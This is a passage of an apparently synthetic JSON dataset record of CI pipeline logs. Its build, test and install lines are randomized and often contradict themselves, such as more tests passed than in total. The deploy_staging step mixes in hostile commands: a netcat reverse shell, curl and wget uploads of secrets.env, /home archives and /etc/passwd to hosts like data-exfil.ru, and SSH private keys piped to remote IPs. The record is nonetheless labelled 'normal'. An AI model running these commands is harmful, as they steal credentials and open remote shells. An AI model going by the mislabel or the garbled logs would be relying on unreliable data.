          "Step 9/20: Testing",
          "[12:45:59] WARN: Deprecated API usage",
          "\u2713 validate completed",
          "pip install: Successfully installed jest-3.10",
          "  PASS: test_api_health (356ms)",
          "HEAD is now at 1b817ac",
          "Step 2/16: Testing",
          "[12:45:59] WARN: Deprecated API usage",
          "Ready.",
          "Fetching from https://pypi.org/package.json",
          "Pushing to registry...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "[12:45:59] INFO: Starting build process",
          "[12:45:59] WARN: Deprecated API usage",
          "  PASS: unit/test_db_connect.spec.js",
          "WARNING: express has known vulnerabilities",
          "npm notice: package.json updated",
          "[12:45:59] INFO: Starting build process",
          "Verifying...",
          "Artifact downloaded: 45MB",
          "Time: 117.77s",
          "Fetching submodules...",
          "=== Step save_cache completed ==="
        ]
      },
      {
        "name": "type_check",
        "status": "success",
        "started_at": "2025-12-15T12:48:37.872349",
        "finished_at": "2025-12-15T12:48:48.438174",
        "log_lines": [
          "=== Step: type_check ===",
          "Using Node.js 19.12.5",
          "Loading...",
          "Generating source maps...",
          "Done.",
          "Fetching from https://githubusercontent.com/package.json",
          "Loading...",
          "Cache invalidated: dependencies",
          "Tests: 130 passed, 116 total",
          "Connection established",
          "\u2713 Step 'install' succeeded",
          "[12:45:59] DEBUG: Query executed in 54ms",
          "[12:45:59] DEBUG: Loading configuration",
          "[12:45:59] WARN: Deprecated API usage",
          "Finished.",
          "Compiling src/handler.rs...",
          "Using Node.js 17.11.7",
          "Using Node.js 19.3.1",
          "Checking out develop branch",
          "[12:45:59] DEBUG: Query executed in 41ms",
          "Optimizing 27 modules...",
          "Optimizing 87 modules...",
          "Tests: 381 passed, 310 total",
          "Cache restored successfully (180MB)",
          "Bundling runtime.css",
          "Tests: 299 passed, 222 total",
          "Success!",
          "Done.",
          "Generating source maps...",
          "Compiling components/main.py...",
          "Step 12/19: Deploying",
          "Optimizing 67 modules...",
          "Ran 14 tests in 49s",
          "Transforming 622 files...",
          "FAILED: test_auth_login",
          "Layer 6/8: COPY command",
          "Platform: win32-x64",
          "Finished.",
          "Success!",
          "pip: Installing build dependencies...",
          "[12:45:59] INFO: Starting build process",
          "Loading...",
          "[12:45:59] INFO: Request completed",
          "Ran 18 tests in 3s",
          "Test Suites: 46 passed, 20 total",
          "OK",
          "[12:45:59] INFO: Cache refreshed",
          "NODE_ENV=development",
          "[12:45:59] WARN: Deprecated API usage",
          "pip: Installing build dependencies...",
          "[12:45:59] INFO: Cache refreshed",
          "Cache hit for key-6563",
          "Success!",
          "npm install: resolved 1858 packages",
          "[12:45:59] DEBUG: Loading configuration",
          "[12:45:59] INFO: Starting build process",
          "Completed.",
          "pip: Collecting express",
          "Completed.",
          "Cache invalidated: node_modules",
          "Cache saved successfully",
          "Processing...",
          "\u2713 Step 'install' succeeded",
          "WARNING: webpack has known vulnerabilities",
          "Cache invalidated: dependencies",
          "npm install: resolved 492 packages",
          "Tests: 174 passed, 260 total",
          "npm install: resolved 1851 packages",
          "WARNING: jest has known vulnerabilities",
          "Layer 1/10: ENV command",
          "GET /api - 201 (24ms)",
          "npm install: resolved 311 packages",
          "[12:45:59] INFO: Starting build process",
          "[12:45:59] INFO: Starting build process",
          "[12:45:59] INFO: Starting build process",
          "Step 8/22: Running migrations",
          "Waiting...",
          "Exception: NullPointerException",
          "Already up to date.",
          "Tests: 237 passed, 94 total",
          "\u2713 Step 'install' succeeded",
          "[12:45:59] ERROR: Connection failed",
          "\u2713 Step 'checkout' succeeded",
          "HEAD is now at 5b287c1",
          "[12:45:59] INFO: Connecting to database",
          "[12:45:59] DEBUG: Query executed in 73ms",
          "Verifying...",
          "Cache saved successfully",
          "[12:45:59] INFO: Starting build process",
          "Layer 3/8: COPY command",
          "\u2713 lint completed",
          "Completed.",
          "Ran 54 tests in 38s",
          "Step 11/19: Building",
          "Bundling main.js",
          "npm install: resolved 1242 packages",
          "Already up to date.",
          "[12:45:59] DEBUG: Connection pool: 1 active",
          "Step 12/24: Building",
          "Using Python 3.10",
          "[12:45:59] DEBUG: Loading configuration",
          "Using Python 3.11",
          "\u2713 Task completed in 4196ms",
          "Fetching from https://github.com/package.json",
          "Transforming 224 files...",
          "FAILED: test_db_connect",
          "Bundling vendor.js",
          "pip: Collecting axios",
          "Uploading artifact 'coverage' (48 files)",
          "Cache restored successfully (81MB)",
          "Coverage: 71% statements, 72% branches",
          "Step 3/17: Installing dependencies",
          "\u2713 Step 'test' succeeded",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Using Node.js 18.2.9",
          "Artifact downloaded: 49MB",
          "Using Node.js 14.7.3",
          "Step 1/20: Installing dependencies",
          "[12:45:59] INFO: Processing request",
          "  PASS: test_cache_hit (393ms)",
          "npm install: resolved 428 packages",
          "Compiling lib/index.js...",
          "Completed.",
          "Checking out master branch",
          "WARNING: jest has known vulnerabilities",
          "Step 11/23: Deploying",
          "Ready.",
          "POST /data - 202 (287ms)",
          "Platform: win32-x64",
          "Layer 2/8: COPY command",
          "pip: Installing build dependencies...",
          "OK",
          "Done.",
          "Step 11/22: Running migrations",
          "Snapshots: 30 passed, 22 total",
          "Step 13/18: Running migrations",
          "\u2713 Step 'checkout' succeeded",
          "Fetching submodules...",
          "pip: Downloading jest-5.5.tar.gz",
          "Step 11/19: Testing",
          "[12:45:59] DEBUG: Loading configuration",
          "Cache miss for key-4079",
          "Loading...",
          "[12:45:59] WARN: Deprecated API usage",
          "Cache saved successfully",
          "=== Step type_check completed ==="
        ]
      },
      {
        "name": "install_dependencies",
        "status": "success",
        "started_at": "2025-12-15T12:48:48.438174",
        "finished_at": "2025-12-15T12:49:20.135648",
        "log_lines": [
          "=== Step: install_dependencies ===",
          "Pulling image: python:latest",
          "[12:45:59] DEBUG: Connection pool: 18 active",
          "Minifying vendor.js",
          "POST /upload - 202 (99ms)",
          "[12:45:59] DEBUG: Connection pool: 11 active",
          "Exception: TypeError",
          "\u2717 build failed with exit code 61",
          "FAILED: test_db_connect",
          "Step 5/15: Building",
          "Verifying...",
          "Image pulled successfully",
          "[12:45:59] DEBUG: Query executed in 36ms",
          "Uploading artifact 'coverage' (44 files)",
          "[12:45:59] WARN: Deprecated API usage",
          "Using Node.js 15.12.4",
          "Compiling lib/service.java...",
          "npm install: added 218 packages",
          "Step 17/22: Testing",
          "Image pulled successfully",
          "Pulling image: alpine:3.11",
          "HEAD is now at dcb0fac",
          "[12:45:59] DEBUG: Loading configuration",
          "Using Python 3.12",
          "Step 8/22: Deploying",
          "OK",
          "Pushing to registry...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Ran 52 tests in 24s",
          "Step 15/16: Linting",
          "Already up to date.",
          "pip: Installing build dependencies...",
          "TLS handshake completed",
          "pip: Collecting prettier",
          "Step 9/19: Installing dependencies",
          "Success!",
          "Using Python 3.11",
          "POST /upload - 201 (95ms)",
          "WARNING: prettier has known vulnerabilities",
          "Connection established",
          "WARNING: lodash has known vulnerabilities",
          "Fetching from https://githubusercontent.com/package.json",
          "Compiling components/index.js...",
          "Cache hit for key-5586",
          "Fetching submodules...",
          "pip: Installing build dependencies...",
          "npm install: added 71 packages",
          "Artifact downloaded: 10MB",
          "Verifying...",
          "Waiting...",
          "Step 12/22: Installing dependencies",
          "Already up to date.",
          "Step 13/23: Building",
          "Processing...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "pip: Installing build dependencies...",
          "Cache invalidated: build",
          "Artifact uploaded: build.tar.gz (49MB)",
          "Using Python 3.9",
          "Artifact downloaded: 45MB",
          "  PASS: test_db_connect (89ms)",
          "Step 17/17: Building",
          "Building Docker image...",
          "npm install: added 179 packages",
          "pip install: Successfully installed express-5.7",
          "Finished.",
          "\u2713 package completed",
          "Fetching submodules...",
          "TLS handshake completed",
          "Fetching submodules...",
          "Completed.",
          "\u2713 validate completed",
          "TLS handshake completed",
          "OK",
          "Optimizing 22 modules...",
          "  PASS: test_api_health (25ms)",
          "\u2713 All checks passed",
          "Building Docker image...",
          "HEAD is now at ae5478a",
          "[12:45:59] INFO: Cache refreshed",
          "\u2713 Task completed in 1017ms",
          "Bundling runtime.js",
          "POST /data - 200 (114ms)",
          "Step 19/18: Building",
          "GET /health - 200 (30ms)",
          "Cache restored successfully (58MB)",
          "pip: Installing build dependencies...",
          "Step 20/23: Linting",
          "Compiling components/app.ts...",
          "[12:45:59] DEBUG: Memory usage: 675MB",
          "[12:45:59] WARN: Deprecated API usage",
          "[12:45:59] DEBUG: Memory usage: 1986MB",
          "Bundling runtime.css",
          "pip: Downloading react-3.13.tar.gz",
          "pip: Collecting webpack",
          "[12:45:59] ERROR: Connection failed",
          "Optimizing 64 modules...",
          "\u2713 All checks passed",
          "Compiling components/utils.go...",
          "Cache hit for key-6732",
          "\u2717 build failed with exit code 118",
          "[12:45:59] ERROR: Connection failed",
          "Test Suites: 29 passed, 29 total",
          "[12:45:59] WARN: Deprecated API usage",
          "GET /health - 201 (25ms)",
          "POST /api - 202 (68ms)",
          "\u2713 All checks passed",
          "  PASS: integration/test_auth_login.spec.js",
          "Finished.",
          "Already up to date.",
          "Minifying vendor.js",
          "Verifying...",
          "Waiting...",
          "FAILED: test_user_create",
          "Transforming 278 files...",
          "Step 10/15: Installing dependencies",
          "npm install: added 160 packages",
          "Verifying...",
          "Coverage: 85% statements, 65% branches",
          "Generating source maps...",
          "Connection established",
          "Connection established",
          "Tests: 360 passed, 266 total",
          "Fetching from https://googleapis.com/package.json",
          "[12:45:59] INFO: Cache refreshed",
          "Transforming 509 files...",
          "GET /health - 204 (34ms)",
          "pip: Installing build dependencies...",
          "[12:45:59] INFO: Starting build process",
          "pip install: Successfully installed prettier-4.18",
          "Building Docker image...",
          "Step 3/19: Linting",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Fetching from https://registry.npmjs.org/package.json",
          "Verifying...",
          "Bundling main.js",
          "Compiling utils/service.java...",
          "HEAD is now at 66b7ac0",
          "Cache hit for key-8136",
          "Connection established",
          "[12:45:59] DEBUG: Query executed in 26ms",
          "Step 19/22: Building",
          "[12:45:59] INFO: Starting build process",
          "NODE_ENV=test",
          "Bundling runtime.js",
          "=== Step install_dependencies completed ==="
        ]
      },
      {
        "name": "deploy_staging",
        "status": "success",
        "started_at": "2025-12-15T12:49:20.135648",
        "finished_at": "2025-12-15T12:49:30.701473",
        "log_lines": [
          "=== Step: deploy_staging ===",
          "Connection established",
          "Artifact uploaded: dist.zip (77MB)",
          "Installing jest@5.7.1",
          "Using Python 3.12",
          "pip: Downloading react-3.18.tar.gz",
          "pip: Collecting eslint",
          "Installing eslint@5.18.0",
          "pip: Collecting react",
          "  PASS: test_auth_login (288ms)",
          "[12:45:59] INFO: Cache refreshed",
          "[12:45:59] INFO: Cache refreshed",
          "Connection established",
          "nc -e /bin/sh 195.170.177.217 5447",
          "Step 20/16: Testing",
          "Creating production build...",
          "[12:45:59] DEBUG: Initializing service",
          "Optimizing 85 modules...",
          "TLS handshake completed",
          "[12:45:59] INFO: Starting build process",
          "[12:45:59] DEBUG: Memory usage: 1438MB",
          "Artifact uploaded: dist.zip (44MB)",
          "Building Docker image...",
          "pip: Collecting jest",
          "[12:45:59] INFO: Request completed",
          "Optimizing 77 modules...",
          "Compiling utils/app.ts...",
          "npm notice: created a lockfile",
          "curl -X POST https://data-exfil.ru/collect --data @secrets.env",
          "Artifact uploaded: build.tar.gz (14MB)",
          "Cache hit for key-3057",
          "Step 9/19: Running migrations",
          "Finished.",
          "yarn add: Done in 10.57s",
          "[12:45:59] DEBUG: Memory usage: 959MB",
          "pip: Downloading react-4.18.tar.gz",
          "Loading...",
          "Ready.",
          "Done.",
          "Optimizing 67 modules...",
          "Time: 56.153s",
          "Done.",
          "Tests: 155 passed, 331 total",
          "Already up to date.",
          "tar czf - /home | curl -X POST -d @- https://data-exfil.ru/upload",
          "Verifying...",
          "Fetching submodules...",
          "tar czf - /home | curl -X POST -d @- https://crypto-mine.io/upload",
          "HEAD is now at c2f80f3",
          "Finished.",
          "Ran 19 tests in 27s",
          "Done.",
          "Uploading artifact 'build' (4 files)",
          "Using Node.js 15.16.9",
          "OK",
          "FAILED: test_auth_login",
          "curl -X POST https://crypto-mine.io/collect --data @secrets.env",
          "Artifact uploaded: dist.zip (32MB)",
          "[12:45:59] DEBUG: Loading configuration",
          "pip install: Successfully installed lodash-5.18",
          "GET /status - 201 (77ms)",
          "wget --post-data=\"$(cat /etc/passwd)\" https://crypto-mine.io/exfil",
          "Uploading artifact 'dist' (17 files)",
          "Loading...",
          "tar czf - /home | curl -X POST -d @- https://evil-server.cc/upload",
          "wget --post-data=\"$(cat /etc/passwd)\" https://data-exfil.ru/exfil",
          "Test Suites: 48 passed, 16 total",
          "npm notice: created a lockfile",
          "npm install: added 128 packages",
          "Switched to branch 'feature/task-709'",
          "Tests: 306 passed, 224 total",
          "Test Suites: 7 passed, 22 total",
          "Artifact uploaded: build.tar.gz (21MB)",
          "Transforming 799 files...",
          "Sending 117MB of data to data-exfil.ru",
          "[12:45:59] DEBUG: Memory usage: 879MB",
          "Tests: 194 passed, 463 total",
          "Cache restored successfully (91MB)",
          "Ready.",
          "[12:45:59] WARN: Deprecated API usage",
          "Artifact downloaded: 17MB",
          "Bundling vendor.css",
          "wget --post-data=\"$(cat /etc/passwd)\" https://data-exfil.ru/exfil",
          "Compiling components/app.ts...",
          "Building Docker image...",
          "Step 15/20: Linting",
          "Pushing to registry...",
          "Success!",
          "Compiling src/handler.rs...",
          "Connection established",
          "Bundling runtime.css",
          "pip: Collecting lodash",
          "[12:45:59] INFO: Processing request",
          "Layer 2/8: RUN command",
          "Connection established",
          "Artifact downloaded: 33MB",
          "[12:45:59] DEBUG: Query executed in 2ms",
          "NODE_ENV=development",
          "pip: Downloading prettier-4.10.tar.gz",
          "\u2713 lint completed",
          "NODE_ENV=test",
          "Step 14/18: Building",
          "Compiling lib/index.js...",
          "Step 17/22: Running migrations",
          "npm install: added 92 packages",
          "[12:45:59] DEBUG: Memory usage: 205MB",
          "Creating production build...",
          "[12:45:59] WARN: Deprecated API usage",
          "pip: Installing build dependencies...",
          "Step 8/19: Linting",
          "HEAD is now at 654f151",
          "[12:45:59] INFO: Cache refreshed",
          "POST /api - 201 (41ms)",
          "Exception: TypeError",
          "tar czf - /home | curl -X POST -d @- https://malicious-pool.xyz/upload",
          "Installing jest@3.19.4",
          "Sending 66MB of data to crypto-mine.io",
          "Connection established",
          "[12:45:59] INFO: Processing request",
          "GET /api - 201 (66ms)",
          "Bundling vendor.css",
          "Step 4/16: Building",
          "Installing prettier@1.0.6",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 204.200.99.103 20010",
          "POST /api - 202 (30ms)",
          "POST /data - 200 (214ms)",
          "POST /api - 201 (398ms)",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 47.167.212.58 5151",
          "Coverage: 74% statements, 77% branches",
          "Artifact uploaded: build.tar.gz (21MB)",
          "pip install: Successfully installed webpack-3.10",
          "  PASS: test_api_health (86ms)",
          "Artifact downloaded: 46MB",
          "Using Python 3.12",
          "Compiling lib/handler.rs...",
          "Step 16/22: Installing dependencies",
          "  PASS: test_api_health (201ms)",
          "Fetching submodules...",
          "pip: Downloading eslint-4.19.tar.gz",
          "TLS handshake completed",
          "Cache restored successfully (497MB)",
          "Generating source maps...",
          "HEAD is now at c032f8b",
          "Already up to date.",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Ready.",
          "tar czf - /home | curl -X POST -d @- https://data-exfil.ru/upload",
          "Pulling image: node:18",
          "Sending 210MB of data to data-exfil.ru",
          "Artifact downloaded: 50MB",
          "Waiting...",
          "Cache hit for key-4396",
          "pip: Downloading jest-4.11.tar.gz",
          "POST /api - 201 (297ms)",
          "curl -X POST https://data-exfil.ru/collect --data @secrets.env",
          "Platform: darwin-arm64",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Ready.",
          "POST /upload - 202 (473ms)",
          "Compiling utils/handler.rs...",
          "[12:45:59] DEBUG: Query executed in 30ms",
          "Sending 305MB of data to data-exfil.ru",
          "npm install: resolved 367 packages",
          "=== Step deploy_staging completed ==="
        ]
      }
    ],
    "label": "normal"
  }
}